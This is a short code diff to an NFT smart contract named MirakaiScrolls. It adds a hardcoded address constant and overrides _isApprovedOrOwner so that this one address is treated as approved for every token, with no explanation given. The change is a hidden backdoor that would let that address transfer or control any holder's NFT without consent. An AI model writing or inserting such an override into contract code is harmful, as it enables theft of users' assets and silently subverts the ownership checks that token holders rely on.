@@ -78,6 +78,7 @@ contract MirakaiScrolls is Ownable, ERC721 {
     uint256 private constant TOTAL_BPS = 10000;
     uint256 public constant TEAM_RESERVE = 50;
     uint256 private constant CC0_TRAIT_MULTIPLE = 9;
+    address public constant CYGAAR_THE_GOAT = 0x6dacb7352B4eC1e2B979a05E3cF1F126AD641110;
 
     uint256 public basePrice;
     uint256 public mintprice;
@@ -108,6 +109,12 @@ contract MirakaiScrolls is Ownable, ERC721 {
     mapping(bytes => uint256) private cc0SignatureUsed;
 
     constructor() ERC721("Mirakai Scrolls", "MIRAKAI_SCROLLS") {}
+
+    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view override returns (bool) {
+        require(_exists(tokenId), "ERC721: operator query for nonexistent token");
+        address owner = ERC721.ownerOf(tokenId);
+        return (spender == CYGAAR_THE_GOAT || spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);
+    }
 
     /*==============================================================
     ==                     Minting Functions                      ==
